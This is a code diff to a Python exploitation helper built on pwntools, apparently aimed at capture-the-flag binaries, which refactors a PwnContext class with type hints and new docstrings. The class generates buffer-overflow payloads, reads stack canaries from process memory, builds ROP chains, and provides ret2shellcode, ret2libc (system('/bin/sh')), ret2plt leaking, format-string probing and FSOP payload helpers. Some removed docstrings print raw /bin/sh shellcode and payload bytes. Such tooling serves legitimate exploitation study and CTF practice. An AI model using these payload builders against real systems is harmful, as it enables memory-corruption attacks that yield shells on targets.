@@ -1,6 +1,7 @@
 import math
 import re
 import os
+from typing import NoReturn
 
 from pwn import ELF, ROP, asm, context, cyclic, cyclic_find, log, shellcraft, flat
 from pwnlib.rop.gadgets import Gadget
@@ -9,33 +10,54 @@ from pwninit.helpers.utils import u64, upack, encode
 from pwninit.helpers.constants import *
 
 class PwnContext:
-    """A context class for managing pwn tools state, including IO, ELF, libc,
-    and exploitation helpers.
+    """A context class for managing pwntools state, including IO, ELF binaries,
+    libc libraries, and common exploitation helpers.
 
     Attributes:
-        io (IOContext): The IO context for interacting with the target.
-        elf (ELF): The ELF binary being exploited.
-        libc (ELF): The libc library being used.
-        prefix (str): Prefix for sending/receiving data.
-        _offset (int): Cached offset for buffer overflows.
-        _canary (int): Cached canary value.
+        io (IOContext): The active IO connection or process context.
+        config (Config): The configuration setup containing binaries and paths.
     """
 
-    def __init__(self, io, elf, libc, libs=[], prefix=None):
+    def __init__(
+        self,
+        io: IOContext,
+        config: Config
+    ) -> None:
         self.io = io
-        self.elf = elf
-        self.libc = libc
-        self.libs = [ELF(l) for l in libs]
-        self.prefix = prefix
+        self.config = config
+
         self._offset = None
         self._canary = None
 
+        self._elf = ELF(config.binary) if isinstance(config.binary, (str, bytes)) else config.binary
+        self._libc = ELF(config.libc) if isinstance(config.libc, (str, bytes)) else config.libc        
+        self._libs = [
+            ELF(lib) if isinstance(lib, (str, bytes)) else lib 
+            for lib in (config.libs or [])
+        ]
+
     @property
-    def canary(self):
-        """Get the canary value for the current process.
+    def elf(self) -> ELF:
+        return self._elf
+
+    @property
+    def libc(self) -> ELF:
+        return self._libc
+
+    @property
+    def libs(self) -> list:
+        return self._libs
+
+    @property
+    def prefix(self) -> str | bytes | None:
+        return self.config.prefix
+
+    @property
+    def canary(self) -> int | None:
+        """Get the canary value for the current process from /proc auxv.
 
         Returns:
-            int: The canary value, or None if not found.
+            int | None: The canary value, or None if not found/applicable.
         """
         if self._canary: return self._canary
         if not self.elf.canary: log.warn("no canary in this binary"); return self._canary
@@ -46,23 +68,23 @@ class PwnContext:
         for i in range(0, len(auxv), 2 * word):
             a_type = u64(auxv[i : i + word])
             a_val = u64(auxv[i + word : i + 2 * word])
-            if a_type == 25:  # AT_RANDOM
+            if a_type == 25:
                 self.canary = u64((b"\x00" + self.io.proc.readmem(a_val + 1, 7)))
                 break
 
         return self._canary
 
     @canary.setter
-    def canary(self, new_canary):
+    def canary(self, new_canary: int):
         self._canary = new_canary
 
     @property
-    def offset(self):
-        """Get the offset for buffer overflows by sending a cyclic pattern and
-        analyzing the corefile.
+    def offset(self) -> int | None:
+        """Find the buffer overflow offset dynamically by sending a cyclic pattern
+        and reading the corefile fault address.
 
         Returns:
-            int: The offset value.
+            int | None: The found offset length.
         """
         if self._offset: return self._offset
 
@@ -76,16 +98,10 @@ class PwnContext:
         return self._offset
 
     @offset.setter
-    def offset(self, new_offset):
-        """
-        Get the offset for buffer overflows by sending a cyclic pattern and analyzing the corefile.
-
-        Returns:
-            int: The offset value.
-        """
+    def offset(self, new_offset: int):
         self._offset = new_offset
 
-    def __find_sym(self, symbol, bin_obj):
+    def __find_sym(self, symbol: str | int, bin_obj: ELF) -> int:
         if isinstance(symbol, int):
             return symbol
         elif "+" in symbol:
@@ -97,34 +113,39 @@ class PwnContext:
         else:
             return bin_obj.sym[symbol]
 
-    def resolve(self, symbol):
-        """
-        Resolve a symbol to an address in either the ELF or libc.
+    def resolve(self, symbol: str | int) -> int:
+        """Resolve a symbol or offset expression within the known ELF context,
+        libc, or extra libraries.
 
         Args:
-            symbol (str or int): The symbol name or address.
+            symbol (str | int): The symbol name, structural math, or absolute address.
 
         Returns:
-            int: The resolved address, or None if not found.
-        """
-        if isinstance(symbol, int):
-            return symbol
+            int: The resolved memory address.
 
+        Example:
+        
+            >>> ctx.resolve("main")
+            0x401196
+            >>> ctx.resolve("system+0x10")
+            0x7ffff7e12390
+        """
         for b in [self.libc, self.elf] + self.libs:
             try:
                 return self.__find_sym(symbol, b)
             except KeyError:
                 pass
 
+        log.error(f"{symbol} not found !")
+
     def check_leak(self, leaked: int) -> tuple:
-        """
-        Check if a leaked value corresponds to a known memory region (e.g., libc, elf, canary).
+        """Match a raw memory leak value against known virtual memory regions.
 
         Args:
-            leak (int): The leaked value.
+            leaked (int): The raw memory address leaked.
 
         Returns:
-            tuple: (name, base) where `name` is the region name and `base` is the base address.
+            tuple: A (name, base_address) pair if a region is matched, else (None, None).
         """
         if not self.io or not self.io.proc:
             return None, None
@@ -145,8 +166,29 @@ class PwnContext:
 
         return None, None
 
+    def find_leak(self, buf: int | str | bytes) -> int:
+        """Extract and isolate an address integer out of standard text or binary buffers.
 
-    def find_leak(self, buf:int|str|bytes) -> int:
+        Args:
+            buf (int | str | bytes): Raw buffer chunk containing the potential leak.
+
+        Returns:
+            int: The isolated absolute leak value.
+
+        Example:
+
+            >>> find_leak(b'\\x00\\x00\\x00\\x9d{\\xdar\\x90 \\xf2\\x10.\\xf2\\x92\\xff\\x7f\\x00\\x00\\xeeo\\x9f\\r\\x1bV\\x00\\x00\\xd3\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00vu?\\xfb\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x9d{\\xdar\\x90 \\xf2\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa8LU?\\xfb\\x7f\\x00\\x00\\x10/\\xf2\\x92\\xff\\x7f\\x00\\x00zo\\x9f\\r\\x1bV\\x00\\x000\\xf0p?\\x01\\x00\\x00\\x00(/')
+                [*] [canary]: leak[3:10]
+                [*] [canary]: leak[4:10]
+                [*] [stack]: leak[10:16]
+                [*] [boring]: leak[18:24]
+                [*] [ld-2]: leak[34:40]
+                [*] [canary]: leak[51:58]
+                [*] [canary]: leak[52:58]
+                [*] [libc-2]: leak[66:72]
+                [*] [stack]: leak[74:80]
+                [*] [boring]: leak[82:88]
+        """
         if isinstance(buf, int):
             return buf
 
@@ -163,30 +205,31 @@ class PwnContext:
                     name, _ = self.check_leak(l_val)
                     if name:
                         log.info(f"[{name}]: leak[{i}:{i + j}]")
+                        break
             log.warn("cannot find leak, try another way")
-            exit(0) # early exit, we don't need to continue
+            exit(0)
 
         return leak_val
 
-    def leak(self, leaked:int|str|bytes, offset=0, name=""):
-        """
-        Parse and log a memory leak, optionally assigning it to a context variable.
+    def leak(self, leaked: int | str | bytes, offset: int = 0, name: str = "") -> int:
+        """Parse, apply math adjustments, map to segments, and log an expected leak.
 
         Args:
-            leak (bytes or str): The leaked data.
-            leaked (int): Value to subtract from the leak.
-            name (str): Name of the variable to assign the leak to (e.g., "libc", "elf").
+            leaked (int | str | bytes): Raw string containing a leak, or the address directly.
+            offset (int): Base offset value to subtract from the parsed address.
+            name (str): Enforce mapping assignment to a known identifier (e.g., "libc").
 
         Returns:
-            int: The parsed leak value.
+            int: The normalized leak address value.
 
         Example:
+        
+            >>> stack = leak(b"b'] The address of cmd where you are writing to is: 0x7fff121e12d0'")
+            [*] [stack]: 0x7fff121e12d0
+            >>> hex(stack)
+            0x7fff121e12d0
 
-            >>> stack = leak(b'[LEAK] The address of cmd where you are writing to is: 0x7ffeab2e0b90')
-            [*] [stack]: leak = 0x7ffc710958d0
-
-            >> print(hex(stack))
-            0x7ffc710958d0
+            >>> libc.address = leak(b"puts address: 0x7ffff7e114a0", offset=libc.sym['puts'])
         """
         base = 0
         leaked = self.find_leak(leaked) - offset
@@ -194,7 +237,7 @@ class PwnContext:
         if not name:
             name, base = self.check_leak(leaked)
 
-        if base > 0 and leaked != base and name!='stack':
+        if base > 0 and leaked != base and name != 'stack':
             log.info(f"[{name}]: leak = {leaked:#x}, base = {base:#x}, offset = {leaked - base}")
         elif name:
             log.info(f"[{name}]: {leaked:#x}")
@@ -205,26 +248,20 @@ class PwnContext:
 
         return leaked
 
-    def ropchain(self, chain, ret=True):
-        """
-        Generate a ROP chain for the specified chain of function calls.
+    def ropchain(self, chain: dict, ret: bool = True) -> bytes:
+        """Construct a compiled ROP chain given target calls and setup states.
 
         Args:
-            chain (dict): A dictionary mapping function names to their arguments.
-            ret (bool): If True, add a `ret` gadget at the start and end of the chain.
+            chain (dict): Function labels or addresses mapped to parameter list configurations.
+            ret (bool): Insert stack aligning `ret` instructions when building chains.
 
         Returns:
-            bytes: The generated ROP chain.
+            bytes: The assembled payload sequence.
 
         Example:
-
-            >>> payload = ropchain({"shell": []}})
-            [*] ROP :
-                0x0000:        0x804835a ret
-                0x0004:        0x8048516 shell()
-                0x0008:        0x804835a ret
-            >>> payload
-            b'Z\\x83\\x04\\x08\\x16\\x85\\x04\\x08Z\\x83\\x04\\x08'
+        
+            >>> ropchain({"puts": [0x404000], "main": []})
+            b'\\xaa\\xbb...'
         """
         elfs = []
         if self.elf and (not self.elf.pie or self.elf.address):
@@ -258,25 +295,22 @@ class PwnContext:
         log.info(f"ROP :\n{rop.dump()}")
         return rop.chain()
 
-    def bof(self, data, opt=None, bp=None, **kwargs):
-        """
-        Generate a buffer overflow payload with optional canary and base pointer.
-        Canary and offset are set using ctx.offset and ctx.canary
+    def bof(self, data: bytes | int, opt: dict = {}, bp: int = 0, **kwargs) -> bytes:
+        """Generate a basic buffer overflow container layout injecting optional canary or base pointers.
 
         Args:
-            data: The data to include in the payload.
-            opt (dict): Optional overrides for specific offsets.
-            bp: Base pointer value to include.
-            **kwargs: Additional arguments for `flat`.
+            data (bytes | int): Intended execution payload control destination (e.g., return address).
+            opt (dict): Specific index manual offset dictionary adjustments.
+            bp (int): Target base pointer (RBP/EBP) replacement value.
 
         Returns:
-            bytes: The generated payload.
+            bytes: Fully structured flat stream buffer padding.
 
         Example:
-
-            >>> ctx.offset = 128
-            >>> bof(b'TEST')
-            b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabTEST'
+        
+            >>> ctx.offset = 40
+            >>> bof(0x401196)
+            b'aaaabaaacaaadaaaeaaafaaa...\\x96\\x11\\x40\\x00\\x00\\x00\\x00\\x00'
         """
         offset_val = self.offset
         canary_val = self.canary
@@ -285,36 +319,27 @@ class PwnContext:
             opt = {}
 
         if canary_val:
-            opt |= {offset_val-context.bytes*2: canary_val}
+            opt |= {offset_val - context.bytes * 2: canary_val}
 
         if bp:
-            opt |= {offset_val-context.bytes: bp}
+            opt |= {offset_val - context.bytes: bp}
 
         return flat({offset_val: data} | opt, **kwargs)
 
-    def ret2shellcode(self, addr: int|str, ret=True, **kwargs):
-        """
-        Generate a payload to return to shellcode at the specified address.
+    def ret2shellcode(self, addr: int | str, ret: bool = True, **kwargs) -> bytes:
+        """Create a buffer payload designed to resolve and jump to local shellcode injection coordinates.
 
         Args:
-            addr (int): The address of the shellcode.
-            ret (bool): If ropchain adds a ret before the start of the rop
-            **kwargs: Additional arguments for `bof`.
+            addr (int | str): Target point reference calculation indicator context.
+            ret (bool): Include initial stack alignment layout properties.
 
         Returns:
-            bytes: The generated payload.
+            bytes: Complete payload string bytes.
 
         Example:
-
-            >>> ctx.offset = 128
-            >>> payload = ret2shellcode(0x0)
-            [*] Loaded 12 cached gadgets for './ch15'
-            [*] ROP :
-                0x0000:        0x804835a ret
-                0x0004:             0x25 0x25()
-                0x0008:        0x804835a ret
-            >>> payload
-            b'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x81\\xec\\x00\\x10\\x00\\x00jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80gaabZ\\x83\\x04\\x08%\\x00\\x00\\x00Z\\x83\\x04\\x08'
+        
+            >>> ret2shellcode("bss_target")
+            b'\\x90\\x90...jhh///sh/bin...'
         """
         addr = self.resolve(addr)
         shellcode = asm(shellcraft.sh())
@@ -334,18 +359,20 @@ class PwnContext:
         payload = self.ropchain({addr: []}, ret)
         return self.bof(payload, opt={0: [padding, shellcode]}, **kwargs)
 
-    def ret2win(self, win, params=None, ret=True, **kwargs):
-        """
-        Generate a payload to call a `win` function with the specified parameters.
+    def ret2win(self, win: str | int, params: list | tuple = [], ret: bool = True, **kwargs) -> bytes:
+        """Generate an execution redirect straight into an explicit execution function.
 
         Args:
-            win (str or int): The `win` function name or address.
-            params (list): Arguments to pass to the `win` function.
-            ret (bool): If ropchain adds a ret before the start of the rop
-            **kwargs: Additional arguments for `bof`.
+            win (str | int): Name identifier or absolute function target.
+            params (list | tuple): Argument values to associate onto target registers.
+            ret (bool): Append structural target ret properties.
 
         Returns:
-            bytes: The generated payload.
+            bytes: Assembled operational byte blocks.
+
+        Example:
+        
+            >>> ret2win("win_secret_func", params=[0xdeadbeef, 0xcafebabe])
         """
         if params is None:
             params = []
@@ -353,29 +380,27 @@ class PwnContext:
         payload = self.ropchain({addr: params}, ret)
         return self.bof(payload, **kwargs)
 
-    def ret2libc(self, ret=True, **kwargs):
-        """
-        Generate a payload to call `system("/bin/sh")` using libc.
+    def ret2libc(self, ret: bool = True, **kwargs) -> bytes:
+        """Generate a payload framing layout routing control back against libc system components.
 
-        Args:
-            ret (bool): If ropchain adds a ret before the start of the rop
-
-        Returns:
-            bytes: The generated payload.
+        Example:
+        
+            >>> ret2libc()
         """
         system = self.libc.sym["system"]
         payload = self.ropchain({system: [self.binsh()]}, ret)
         return self.bof(payload, **kwargs)
 
-    def ret2plt(self, func="puts", ret2main="main", ret=True, **kwargs):
-        """
-        Generate a payload to leak a libc address using the PLT.
+    def ret2plt(self, func: str | int = "puts", ret2main: str | int = "main", ret: bool = True, **kwargs) -> bytes:
+        """Generate an execution sequence leaking standard internal references through global linkage references.
 
         Args:
-            func (str): The function to leak (default: "puts").
-            ret2main (str): The function to return to after leaking (default: "main").
-            ret (bool): If ropchain adds a ret before the start of the rop
-            **kwargs: Additional arguments for `bof`.
+            func (str | int): PLT mapping reference to extract details via.
+            ret2main (str | int): Destination structure to route towards immediately following.
+
+        Example:
+        
+            >>> ret2plt(func="printf", ret2main="main")
         """
         func_plt = self.elf.plt[func]
         func_got = self.elf.got[func]
@@ -384,19 +409,15 @@ class PwnContext:
             payload = self.ropchain({func_plt: [func_got], main_addr: []}, ret)
         else:
             payload = self.ropchain({func_plt: [func_got]}, ret)
-        self.bof(payload, **kwargs)
-        leak_val = upack(self.io.recv())
-        self.libc.address = leak_val - self.libc.sym[func]
+        return self.bof(payload, **kwargs)
 
-    def format_string(self, n=100):
-        """
-        Exploit a format string vulnerability to leak memory.
+    def format_string(self, n: int = 100) -> bytes:
+        """Evaluate and trace structural offset positioning over string interaction vulnerabilities.
 
-        Args:
-            n (int): Number of `%p` placeholders to include in the payload.
-
-        Returns:
-            int: The index of the payload in the output.
+        Example:
+        
+            >>> format_string(n=50)
+            6
         """
         payload = "A" * context.bytes + ".%p" * n
         self.io.send(payload)
@@ -407,69 +428,65 @@ class PwnContext:
 
     def fsopsh(
         self,
-        func=None,
-        arg=b"/bin/sh\0",
-        file=None,
-        trigger=XSPUTN,
-        lock=None,
-        chain=None,
-    ):
-        """
-        Generate a fsop payload to call a function (usually system("/bin/sh"))
+        func: str | int = "system",
+        arg: bytes | str = b"/bin/sh\0",
+        file: str | int = "_IO_2_1_stdout_",
+        trigger: int = XSPUTN,
+        lock: int = 0x0,
+        chain: int = 0x0,
+    ) -> bytes:
+        """Generate file stream arrangement objects to achieve execution manipulation.
 
-        Arguments:
-            func(int): Address of the function to be called, libc's system by default
-            arg(bytes): First argument of the call, /bin/sh by default
-            file(int): Address of the file structure, libc's stdout by default
-            trigger(int): Vtable entry to trigger call on, XSPUTN by default
-            lock(int): Value to put as lock (an empty zone), file+0x800 by default
+        Args:
+            func (str | int): Target destination routine location address values.
+            arg (bytes | str): Variable string argument properties.
+            file (str | int): Stream object description table base points.
 
         Example:
-
-            >>> fsopsh()
-            b'\\x01\\x01\\x01\\x01\\x01\\x01\\x01;/bin/sh\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\xfb\\xd1\\r\\xadU\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\xf3\\xd1\\r\\xadU\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\\xb2d\\xf9\\x08\\x7f\\x00\\x00@\\x1f~\\xf9\\x08\\x7f\\x00\\x00x\\xf3\\xd1\\r\\xadU\\x00\\x00'
+        
+            >>> fsopsh(func="win", file="_IO_2_1_stderr_")
         """
-
-        func = func or self.libc.sym.system
+        func = self.resolve(func)
+        file = self.resolve(file)
+        arg = encode(arg)
         lock = lock or file + 0x800
-        file = file or self.libc.sym._IO_2_1_stdout_
 
         return flat(
             {
                 0x00: [0x3B01010101010101, arg],
-                0x68: chain if chain else 0x0,
+                0x68: chain,
                 0x78: -1,
-                0x88: lock,  # empty zone as lock
+                0x88: lock,
                 0x90: -1,
-                0xA0: file,  # wide_data
+                0xA0: file,
                 0xD0: func,
-                0xD8: self.libc.sym["_IO_wfile_jumps"]
-                - (trigger - OVERFLOW),  # vtable
-                0xE0: file + (0xD0 - 0x68),  # wide_data->vtable,
+                0xD8: self.libc.sym["_IO_wfile_jumps"] - (trigger - OVERFLOW),
+                0xE0: file + (0xD0 - 0x68),
             },
             filler=b"\0",
         )
 
-    def binsh(self):
-        """
-        Find the address of `/bin/sh` in libc.
-
-        Returns:
-            int: The address of `/bin/sh`.
-        """
+    def binsh(self) -> int:
+        """Locate the string constant value of `/bin/sh` matching references across libc targets."""
         return next(self.libc.search(b"/bin/sh\0"))
 
 
 pwnctx = None
 
 def set_ctx(new_ctx: PwnContext):
+    """Assign the global singleton instance context configuration.
+
+    Example:
+    
+        >>> ctx = PwnContext(io, config)
+        >>> set_ctx(ctx)
+    """
     global pwnctx
     pwnctx = new_ctx
 
 def _require_ctx():
     if pwnctx is None:
         raise RuntimeError("PwnContext not initialized — call set_ctx() first")
-
 
 def _ctx(name):
     def wrapper(*args, **kwargs):
@@ -480,8 +497,9 @@ def _ctx(name):
     return wrapper
 
 leak = _ctx("leak")
+find_leak = _ctx("find_leak")
 resolve = _ctx("resolve")
-check_leaks = _ctx("check_leaks")
+check_leak = _ctx("check_leak")
 ropchain = _ctx("ropchain")
 bof = _ctx("bof")
 ret2shellcode = _ctx("ret2shellcode")
